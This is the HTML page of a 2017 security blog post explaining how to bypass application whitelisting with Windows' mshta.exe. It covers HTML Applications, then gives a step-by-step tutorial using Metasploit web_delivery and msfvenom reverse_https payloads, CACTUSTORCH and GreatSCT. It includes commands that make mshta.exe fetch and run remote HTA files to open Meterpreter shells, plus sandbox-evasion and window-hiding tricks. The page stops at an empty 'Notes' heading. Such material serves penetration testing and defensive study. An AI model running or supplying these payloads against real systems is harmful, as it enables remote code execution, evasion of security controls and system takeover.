<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US" class="no-js">
<!--<![endif]-->
  <head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="profile" href="http://gmpg.org/xfn/11" />
  <link rel="pingback" href="https://blog.conscioushacker.io/xmlrpc.php" />
  <!-- scripts for IE8 and less  -->
  <!--[if lt IE 9]>
    <script src="https://blog.conscioushacker.io/wp-content/themes/customizr/assets/front/js/vendors/html5.js"></script>
  <![endif]-->
<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>Application Whitelisting Bypass: mshta.exe &#8211; Conscious Hacker</title>
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Conscious Hacker &raquo; Feed" href="https://blog.conscioushacker.io/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="Conscious Hacker &raquo; Comments Feed" href="https://blog.conscioushacker.io/index.php/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Conscious Hacker &raquo; Application Whitelisting Bypass: mshta.exe Comments Feed" href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.conscioushacker.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.1"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56794,8205,9794,65039],[55358,56794,8203,9794,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='czr-gfonts-css'  href='//fonts.googleapis.com/css?family=Source+Sans+Pro' type='text/css' media='all' />
<link rel='stylesheet' id='customizr-fa-css'  href='https://blog.conscioushacker.io/wp-content/themes/customizr/assets/shared/fonts/fa/css/font-awesome.min.css?ver=4.0.14' type='text/css' media='all' />
<link rel='stylesheet' id='customizr-main-css'  href='https://blog.conscioushacker.io/wp-content/themes/customizr/assets/front/css/style.min.css?ver=4.0.14' type='text/css' media='all' />
<style id='customizr-main-inline-css' type='text/css'>

.tc-header.border-top { border-top-width: 5px; border-top-style: solid }
#czr-push-footer { display: none; visibility: hidden; }
        .czr-sticky-footer #czr-push-footer.sticky-footer-enabled { display: block; }
        
</style>
<link rel='stylesheet' id='customizr-ms-respond-css'  href='https://blog.conscioushacker.io/wp-content/themes/customizr/assets/front/css/style-modular-scale.min.css?ver=4.0.14' type='text/css' media='all' />
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-content/themes/customizr/assets/front/js/libs/modernizr.min.js?ver=4.0.14'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CZRParams = {"assetsPath":"https:\/\/blog.conscioushacker.io\/wp-content\/themes\/customizr\/assets\/front\/","_disabled":[],"centerSliderImg":"1","isLightBoxEnabled":"1","SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"isAnchorScrollEnabled":"","anchorSmoothScrollExclude":{"simple":["[class*=edd]",".carousel-control","[data-toggle=\"modal\"]","[data-toggle=\"dropdown\"]","[data-toggle=\"tooltip\"]","[data-toggle=\"popover\"]","[data-toggle=\"collapse\"]","[data-toggle=\"tab\"]","[class*=upme]","[class*=um-]"],"deep":{"classes":[],"ids":[]}},"timerOnScrollAllBrowsers":"1","centerAllImg":"1","HasComments":"","LoadModernizr":"1","stickyHeader":"","extLinksStyle":"","extLinksTargetExt":"","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"dropcapEnabled":"","dropcapWhere":{"post":"","page":""},"dropcapMinWords":"","dropcapSkipSelectors":{"tags":["IMG","IFRAME","H1","H2","H3","H4","H5","H6","BLOCKQUOTE","UL","OL"],"classes":["btn"],"id":[]},"imgSmartLoadEnabled":"","imgSmartLoadOpts":{"parentSelectors":["[class*=grid-container], .article-container",".__before_main_wrapper",".widget-front",".post-related-articles",".tc-singular-thumbnail-wrapper"],"opts":{"excludeImg":[".tc-holder-img"]}},"imgSmartLoadsForSliders":"1","pluginCompats":[],"isWPMobile":"","menuStickyUserSettings":{"desktop":"stick_up","mobile":"stick_up"},"adminAjaxUrl":"https:\/\/blog.conscioushacker.io\/wp-admin\/admin-ajax.php","ajaxUrl":"https:\/\/blog.conscioushacker.io\/?czrajax=1","frontNonce":{"id":"CZRFrontNonce","handle":"865379e6f9"},"isDevMode":"","isModernStyle":"1","i18n":{"Permanently dismiss":"Permanently dismiss"},"frontNotifications":{"welcome":{"enabled":false,"content":"","dismissAction":"dismiss_welcome_note_front"}}};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.conscioushacker.io/wp-content/themes/customizr/assets/front/js/tc-scripts.min.js?ver=4.0.14'></script>
<link rel='https://api.w.org/' href='https://blog.conscioushacker.io/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.conscioushacker.io/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.conscioushacker.io/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Application Whitelisting Bypass: msbuild.exe' href='https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/' />
<meta name="generator" content="WordPress 4.9.1" />
<link rel="canonical" href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/" />
<link rel='shortlink' href='https://blog.conscioushacker.io/?p=188' />
<link rel="alternate" type="application/json+oembed" href="https://blog.conscioushacker.io/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.conscioushacker.io%2Findex.php%2F2017%2F11%2F17%2Fapplication-whitelisting-bypass-mshta-exe%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://blog.conscioushacker.io/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.conscioushacker.io%2Findex.php%2F2017%2F11%2F17%2Fapplication-whitelisting-bypass-mshta-exe%2F&#038;format=xml" />
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<link rel="icon" href="https://blog.conscioushacker.io/wp-content/uploads/2017/07/ch.png" sizes="32x32" />
<link rel="icon" href="https://blog.conscioushacker.io/wp-content/uploads/2017/07/ch.png" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="https://blog.conscioushacker.io/wp-content/uploads/2017/07/ch.png" />
<meta name="msapplication-TileImage" content="https://blog.conscioushacker.io/wp-content/uploads/2017/07/ch.png" />
</head>

  <body class="post-template-default single single-post postid-188 single-format-standard czr-link-hover-underline header-skin-dark footer-skin-dark czr-l-sidebar tc-center-images czr-sticky-footer" itemscope itemtype="http://schema.org/WebPage">
    
    
    <div id="tc-page-wrap" class="">

      <header class="tpnav-header__header tc-header sl-logo_left sticky-brand-shrink-on sticky-transparent border-top czr-submenu-fade czr-submenu-move" role="banner" >
          <div class="topbar-navbar__wrapper hidden-md-down" >
  <div class="container-fluid">
    <div class="row flex-row flex-nowrap justify-content-end align-items-center topbar-navbar__row">
              <div class="topbar-nav__container col col-auto">
          <nav id="topbar-nav" class="topbar-nav__nav ">
            <div class="nav__menu-wrapper topbar-nav__menu-wrapper czr-open-on-hover" >
  </div>          </nav>
        </div>
                          <div class="topbar-nav__socials social-links col col-auto">
          <ul class="socials " >
  <li><a rel="nofollow" class="social-icon icon-twitter"  title="Follow us on Twitter" aria-label="Follow us on Twitter" href="https://twitter.com/ConsciousHacker"  target="_blank" ><i class="fa fa-twitter"></i></a></li> <li><a rel="nofollow" class="social-icon icon-github"  title="Follow us on Github" aria-label="Follow us on Github" href="https://github.com/ConsciousHacker"  target="_blank" ><i class="fa fa-github"></i></a></li> <li><a rel="nofollow" class="social-icon icon-feed"  title="Subscribe to my rss feed" aria-label="Subscribe to my rss feed" href="https://blog.conscioushacker.io/index.php/feed/rss/"  target="_blank" ><i class="fa fa-rss"></i></a></li> <li><a rel="nofollow" class="social-icon icon-twitch"  title="Follow us on Twitch" aria-label="Follow us on Twitch" href="https://www.twitch.tv/lopigaming"  target="_blank" ><i class="fa fa-twitch"></i></a></li></ul>
        </div>
          </div>
  </div>
</div>          <div class="primary-navbar__wrapper hidden-md-down desktop-sticky" >
  <div class="container-fluid">
    <div class="row align-items-center flex-row primary-navbar__row">
      <div class="branding__container col col-auto" >
  <div class="branding align-items-center flex-column tagline-below">
  <h1 class="navbar-brand align-self-start " >
  <a class="navbar-brand-sitename  czr-underline" href="https://blog.conscioushacker.io/"  title="Conscious Hacker | We spend so much time consuming what others create, but what makes us human is creating something to help others.">
    <span>Conscious Hacker</span>
  </a>
</h1>

<span class="header-tagline " >
  We spend so much time consuming what others create, but what makes us human is creating something to help others.</span>

  </div>
</div>
      <div class="primary-nav__container justify-content-lg-around col col-lg-auto flex-lg-column" >
  <div class="primary-nav__wrapper flex-lg-row align-items-center justify-content-end">
     <div class="primary-nav__utils nav__utils col-auto" >
    <ul class="nav utils flex-row flex-nowrap regular-nav">
      <li class="nav__search " >
  <a href="#" class="search-toggle_btn icn-search czr-overlay-toggle_btn"  aria-expanded="false"><span class="sr-only">Search</span></a>
  </li>
    </ul>
</div>  </div>
</div>
    </div>
  </div>
</div>          <div class="mobile-navbar__wrapper hidden-lg-up mobile-sticky" >
    <div class="branding__container justify-content-between align-items-center container-fluid" >
  <div class="branding flex-column">
    <h1 class="navbar-brand align-self-start " >
  <a class="navbar-brand-sitename  czr-underline" href="https://blog.conscioushacker.io/"  title="Conscious Hacker | We spend so much time consuming what others create, but what makes us human is creating something to help others.">
    <span>Conscious Hacker</span>
  </a>
</h1>

  </div>
  <div class="mobile-utils__wrapper nav__utils regular-nav">
    <ul class="nav utils row flex-row flex-nowrap">
      <li class="nav__search " >
  <a href="#" class="search-toggle_btn icn-search czr-dropdown" data-aria-haspopup="true" aria-expanded="false"><span class="sr-only">Search</span></a>
      <ul class="dropdown-menu czr-dropdown-menu">
      <li class="header-search__container container-fluid">
  <div class="search-form__container " >
  <form action="https://blog.conscioushacker.io/" method="get" class="czr-form search-form">
    <div class="form-group czr-focus">
            <label for="s-5a584c86528a3" id="lsearch-5a584c86528a3"><span>Search</span><i class="icn-search"></i><i class="icn-close"></i></label>
      <input id="s-5a584c86528a3" class="form-control czr-search-field" name="s" type="text" value="" aria-describedby="lsearch-5a584c86528a3" title="Search &hellip;">
    </div>
  </form>
</div></li>    </ul>
  </li>
<li class="hamburger-toggler__container " >
  <a href="#" class="ham-toggler-menu collapsed" data-toggle="collapse" data-target="#mobile-nav"><div class="ham__toggler-span-wrapper"><span class="line line-1"></span><span class="line line-2"></span><span class="line line-3"></span></div></a>
</li>
    </ul>
  </div>
</div>
<div class="mobile-nav__container " >
   <nav class="mobile-nav__nav flex-column collapse" id="mobile-nav">
      <div class="mobile-nav__inner container-fluid">
      <div class="nav__menu-wrapper mobile-nav__menu-wrapper czr-open-on-click" >
  </div>      </div>
  </nav>
</div></div></header>


  
    <div id="main-wrapper" class="section">

                      

          <div class="czr-hot-crumble container page-breadcrumbs" role="navigation" >
  <div class="row">
        <nav class="breadcrumbs col-12" itemprop="breadcrumb"><span class="trail-begin"><a href="https://blog.conscioushacker.io" title="Conscious Hacker" rel="home" class="trail-begin">Home</a></span> <span class="sep">&raquo;</span> <a href="https://blog.conscioushacker.io/index.php/category/application-whitelisting/" title="Application Whitelisting">Application Whitelisting</a> <span class="sep">&raquo;</span> <span class="trail-end">Application Whitelisting Bypass: mshta.exe</span></nav>  </div>
</div>
          <div class="container" role="main">

            
            <div class="flex-row row column-content-wrapper">

                
                <div id="content" class="col-12 col-md-9 article-container">

                  <article id="post-188" class="post-188 post type-post status-publish format-standard hentry category-application-whitelisting category-application-whitelisting-bypass category-development category-information-security category-security-research" >
    <header class="entry-header " >
  <div class="entry-header-inner">
                <div class="tax__container post-info entry-meta">
          <a class="tax__link" href="https://blog.conscioushacker.io/index.php/category/application-whitelisting/" title="View all posts in Application Whitelisting"> <span>Application Whitelisting</span> </a><a class="tax__link" href="https://blog.conscioushacker.io/index.php/category/application-whitelisting-bypass/" title="View all posts in Application Whitelisting Bypass"> <span>Application Whitelisting Bypass</span> </a><a class="tax__link" href="https://blog.conscioushacker.io/index.php/category/development/" title="View all posts in Development"> <span>Development</span> </a><a class="tax__link" href="https://blog.conscioushacker.io/index.php/category/information-security/" title="View all posts in Information Security"> <span>Information Security</span> </a><a class="tax__link" href="https://blog.conscioushacker.io/index.php/category/security-research/" title="View all posts in Security Research"> <span>Security Research</span> </a>        </div>
        <h1 class="entry-title">Application Whitelisting Bypass: mshta.exe</h1>
        <div class="header-bottom">
      <div class="post-info">
                  <span class="entry-meta">
        <span class="author-meta">by <span class="author vcard author_name"><a class="url fn n" href="https://blog.conscioushacker.io/index.php/author/lopi/" title="View all posts by lopi" rel="author">lopi</a></span></span><span class="v-separator">|</span>Published <a href="https://blog.conscioushacker.io/index.php/2017/11/17/" title="10:58 pm" rel="bookmark"><time class="entry-date published updated" datetime="2017-11-17T22:58:57+00:00">November 17, 2017</time></a>          </span>
                      </div>
    </div>
  </div>
</header>  <div class="post-entry tc-content-inner">
    <section class="post-content entry-content " >
            <div class="czr-wp-the-content">
        <h1>Background</h1>
<p>It&#8217;s been difficult to determine exactly who found &#8220;mshta.exe&#8221; and when they found it. I sent out a <a href="https://twitter.com/ConsciousHacker/status/931630441819336704">tweet</a> asking about this. It can be seen below.</p>
<p><img class="size-full wp-image-189 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_tweet.png" alt="" width="615" height="710" /></p>
<p>Lesley is certainly right, it&#8217;s been awesome for bypassing application whitelisting if it isn&#8217;t blocked. Hopefully someone chimes in and tells us who found it originally. Until then, we&#8217;re going to give all the credit to Microsoft and people that developed &#8220;mshta.exe&#8221; based payloads.</p>
<h1>What is &#8220;mshta.exe&#8221;?</h1>
<p>Let&#8217;s play Casey Smith&#8217;s favorite video game, it&#8217;s called <a href="https://msdn.microsoft.com/en-us/dn308572.aspx">MSDN</a>. I started off with a search for &#8220;mshta.exe&#8221; on Google which led me to <a href="https://msdn.microsoft.com/en-us/library/aa940701(v=winembedded.5).aspx">this</a> then I found <a href="https://msdn.microsoft.com/en-us/library/ms536496%28v=vs.85%29.aspx?f=255&amp;MSPPError=-2147217396">this</a> article on MSDN that explains what HTML Applications are. You can see the two articles below.</p>
<p><img class="size-full wp-image-190 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_msdn_description.png" alt="" width="1200" height="561" /></p>
<p>The key words are highlighted in red: &#8220;Microsoft HTML Application Host&#8221;. At this point, we begin to wonder what a &#8220;Microsoft HTML Application&#8221; is. Let&#8217;s go back to our favorite video game, MSDN, to learn more.</p>
<p><img class="size-full wp-image-191 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_msdn_article.png" alt="" width="1220" height="843" /></p>
<p>The above article states &#8220;HTAs are full fledged-applications&#8221;. That certainly sounds interesting. Let&#8217;s see if we can find some example documentation from Microsoft to weaponize this. I found the following <a href="https://technet.microsoft.com/en-us/library/ee692601.aspx">article</a> on technet.</p>
<p><img class="size-full wp-image-192 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_msdn_intro.png" alt="" width="1127" height="923" /></p>
<p>I&#8217;m going to assume that means we have access to Windows Script Host (WSH) and VBScript within HTML applications. Let&#8217;s keep reading the article.</p>
<p><img class="size-full wp-image-193 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_msdn_intro2.png" alt="" width="1118" height="939" /></p>
<p>Wow that&#8217;s awesome, we can execute VBScript within an HTML application. Our limitations are the capabilities of the scripting languages available within HTML applications. The GUI aspects of this aren&#8217;t that important, however, later in this post I&#8217;ll demonstrate how to utilize Twitter&#8217;s bootstrap within an HTML application. You can also close the window itself so the user doesn&#8217;t see anything when delivering an HTML application via &#8220;mshta.exe&#8221;. Back to Microsoft&#8217;s documentation, I found a series of posts called &#8220;Creating your own HTAs&#8221;. Here&#8217;s a <a href="https://technet.microsoft.com/en-us/library/ee692601.aspx">link</a> to one of these articles, it can also be viewed below.</p>
<p><img class="size-full wp-image-194 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_msdn_intro3.png" alt="" width="1000" height="953" /></p>
<p>Microsoft gives us an example of how to create a function to query for processes via WMI. This should be enough for us to weaponize an &#8220;mshta.exe&#8221; payload if we read more about VBScript language capabilities. And that&#8217;s exactly what attackers have done. We&#8217;ll go over this in the next section. There&#8217;s still the question of what other scripting languages can be used within an HTML application, but I&#8217;ll leave that as a research exercise for the readers. Remember, documentation is your friend.</p>
<h1>Tutorial</h1>
<p>Here&#8217;s a list of various &#8220;mshta.exe&#8221; or &#8220;HTML Application&#8221; payloads I&#8217;m going to cover.</p>
<ul>
<li>Bootstrap in an HTML Application: <a href="https://github.com/t3ntman/Social-Engineering-Payloads/tree/master/Browser-Check">https://github.com/t3ntman/Social-Engineering-Payloads/tree/master/Browser-Check</a></li>
<li>MSBuild &#8220;Not Powershell&#8221; HTML Application: <a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a></li>
<li>HTA Shellcode Launcher (CACTUSTORCH): <a href="https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta">https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta</a></li>
<li>HTA Shellcode Launcher (GreatSCT): <a href="https://github.com/GreatSCT/GreatSCT/blob/master/template/MSBUILD/msbuild.template">https://github.com/GreatSCT/GreatSCT/blob/master/template/MSBUILD/msbuild.template</a></li>
</ul>
<h2>Manual</h2>
<h3>Bootstrap in an HTML Application</h3>
<p>Download <a href="https://twitter.com/t3ntman">@t3ntman</a>&#8216;s &#8220;Browser-Check&#8221; HTML application <a href="https://raw.githubusercontent.com/t3ntman/Social-Engineering-Payloads/master/Browser-Check/browsercheck.hta">here</a>.</p>
<pre>wget https://raw.githubusercontent.com/t3ntman/Social-Engineering-Payloads/master/Browser-Check/browsercheck.hta</pre>
<p>Generate a powershell one line payload with Metasploit.</p>
<p><span style="font-family: Consolas, Monaco, monospace;">msfconsole</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">use exploit/multi/script/web_delivery</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">set LHOST &lt;ip address&gt;</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">set LPORT 443</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">set target 2</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">set payload windows/meterpreter/reverse_https</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">exploit -j</span></p>
<p><img class="aligncenter size-full wp-image-209" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_bootstrap_msfconsole.png" alt="" width="2338" height="753" /></p>
<p>Copy and paste the powershell command into the &#8220;strArgs&#8221; variable in the Browser-Check HTML application. Run the HTML application on the target system.</p>
<pre>mshta.exe https://blog.conscioushacker.io/browsercheck.hta

</pre>
<p><img class="aligncenter size-full wp-image-210" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_bootstrap_execute.png" alt="" width="716" height="771" /><br />
Thanks to <a href="https://twitter.com/t3ntman">@t3ntman</a> for bootstrap in HTML Applications! Check out his social engineer payloads project <a href="https://github.com/t3ntman/Social-Engineering-Payloads">here</a>.</p>
<h3>HTA Shellcode Launcher (CACTUSTORCH)</h3>
<p>Download @vysecurity&#8217;s HTA Shellcode Launcher <a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta">here</a>.</p>
<pre>wget https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta</pre>
<p>Generate raw shellcode with Metasploit and base64 encode it.</p>
<pre>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=192.168.157.130 LPORT=443 -f raw &gt; shellcode.bin

cat shellcode.bin |base64 -w 0</pre>
<p><img class="aligncenter size-full wp-image-211" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_cactustorch_shellcode.png" alt="" width="2341" height="603" /></p>
<p>Copy and paste your shellcode into CACTUSTORCH.hta.</p>
<p><img class="aligncenter size-full wp-image-212" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_cactustorch_edit.png" alt="" width="1061" height="600" /></p>
<p>Run the payload on your target system. My target is a fresh install of Windows 10 Enterprise.</p>
<pre>mshta.exe https://blog.conscioushacker.io/CACTUSTORCH.hta</pre>
<p><img class="aligncenter size-full wp-image-213" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_cacustorch_need_dotnet.png" alt="" width="1087" height="636" /></p>
<p>That&#8217;s interesting to note, CACTUSTORCH needs the .NET Framework installed to work. That makes sense because it relies on James Foreshaw&#8217;s <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>. Let&#8217;s install .NET Framework 3.5 and try executing our payload again.</p>
<p><img class="aligncenter size-full wp-image-214" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_cactustorch_execute.png" alt="" width="604" height="273" /></p>
<p>&nbsp;</p>
<p>CACTUSTORCH executed and injected into &#8220;rundll32.exe&#8221; as we expected. Let&#8217;s check metasploit for our shell.</p>
<p><img class="aligncenter size-full wp-image-215" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_cactustorch_shell.png" alt="" width="2334" height="194" /></p>
<h2>Automated</h2>
<h3>MSBuild &#8220;Not Powershell&#8221; HTML Application (GreatSCT)</h3>
<p>We&#8217;re going to use GreatSCT to generate a &#8220;mshta.exe&#8221; payload.</p>
<p><span style="font-family: Consolas, Monaco, monospace;">git clone https://github.com/GreatSCT/GreatSCT.git</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">cd GreatSCT</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">python3 ./gr8sct.py</span></p>
<p><img class="size-large wp-image-98 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-816x1024.png" alt="" width="816" height="1024" srcset="https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-816x1024.png 816w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-239x300.png 239w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-768x964.png 768w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct.png 1026w" sizes="(max-width: 816px) 100vw, 816px" /></p>
<p>Press any key to begin.</p>
<p><img class="size-full wp-image-198 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_nps_select.png" alt="" width="770" height="718" /></p>
<p>Select option number &#8220;one&#8221; (1) and press enter.</p>
<p><img class="aligncenter size-full wp-image-199" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/msbuild_nps_options.png" alt="" width="1210" height="437" /></p>
<p>Configure any options as desired with &#8220;set&#8221;, i.e. &#8220;set 2 80&#8221; or &#8220;set ListenerPort 80&#8221;. Type &#8220;generate&#8221; and press enter.</p>
<p><img class="aligncenter size-full wp-image-200" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/msbuild_nps_generate.png" alt="" width="2339" height="1146" /></p>
<p>Start your Metasploit listener. Host your payload on a web server and execute with &#8220;mshta.exe https://blog.conscioushacker.io/msbuild_npa.hta&#8221;. Wait for your shell. It&#8217;s important to note that this payload has sandbox detection. You can find the sandbox detection code <a href="https://github.com/GreatSCT/GreatSCT/blob/develop/template/MSBUILD/msbuild_nps_hta.template#L31">here</a>. It&#8217;s also shown below.</p>
<p><img class="aligncenter size-full wp-image-201" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/msbuild_nps_sandbox.png" alt="" width="879" height="156" /></p>
<p>This payload also automatically closes the window of the HTML application. You can find the code to close the window of an HTML application <a href="https://github.com/GreatSCT/GreatSCT/blob/develop/template/MSBUILD/msbuild_nps_hta.template#L55">here</a>.</p>
<p><img class="aligncenter size-full wp-image-202" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/msbuild_nps_window_close.png" alt="" width="190" height="34" />These are some neat tricks for operational &#8220;mshta.exe&#8221; payloads, thanks <a href="https://twitter.com/@TrustedSec">@TrustedSec</a>. Keep it in your notes.</p>
<h3>HTA Shellcode Launcher (GreatSCT)</h3>
<p>We&#8217;re going to use GreatSCT to generate a &#8220;mshta.exe&#8221; payload.</p>
<p><span style="font-family: Consolas, Monaco, monospace;">git clone https://github.com/GreatSCT/GreatSCT.git</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">cd GreatSCT</span></p>
<p><span style="font-family: Consolas, Monaco, monospace;">python3 ./gr8sct.py</span></p>
<p><img class="size-large wp-image-98 aligncenter" src="https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-816x1024.png" alt="" width="816" height="1024" srcset="https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-816x1024.png 816w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-239x300.png 239w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct-768x964.png 768w, https://blog.conscioushacker.io/wp-content/uploads/2017/10/gr8sct.png 1026w" sizes="(max-width: 816px) 100vw, 816px" /></p>
<p>Press any key to begin.</p>
<p><img class="aligncenter size-full wp-image-216" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_htashell_menu.png" alt="" width="769" height="678" /></p>
<p>Select option number &#8220;three&#8221; (3) and press enter.</p>
<p><img class="aligncenter size-full wp-image-217" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_htashell_options.png" alt="" width="2343" height="615" /></p>
<p>Configure any options as desired with &#8220;set&#8221;, i.e. &#8220;set 2 80&#8221; or &#8220;set ListenerPort 80&#8221;. Please note that you can call the COM scriptlet backing the HTA whatever you want. By default, it&#8217;s called &#8220;README.txt&#8221; in GreatSCT. The default can be redefined in a configuration file. Type &#8220;generate&#8221; and press enter.</p>
<p><img class="aligncenter size-full wp-image-218" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_htashell_generated.png" alt="" width="2338" height="716" /></p>
<p>Host the hta and COM scriptlet on a web server. Execute the payload on the target system. In this case, I hosted the HTA and SCT on the same system as the metasploit listener for simplicity because I set the &#8220;HostedDomain&#8221; value to &#8220;http://192.168.157.130&#8221;.</p>
<pre>mshta.exe http://192.168.157.130/HTAtoShell.hta</pre>
<p>Let&#8217;s check Apache&#8217;s access log to see if &#8220;mshta.exe&#8221; grabs the HTA and SCT.</p>
<p><img class="aligncenter size-full wp-image-219" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_htashell_accesslog.png" alt="" width="2339" height="158" /></p>
<p>Check Metasploit for our shell.</p>
<p><img class="aligncenter size-large wp-image-220" src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/mshta_htashell_shell.png" alt="" width="1024" height="60" /></p>
<h1>Notes</h1>
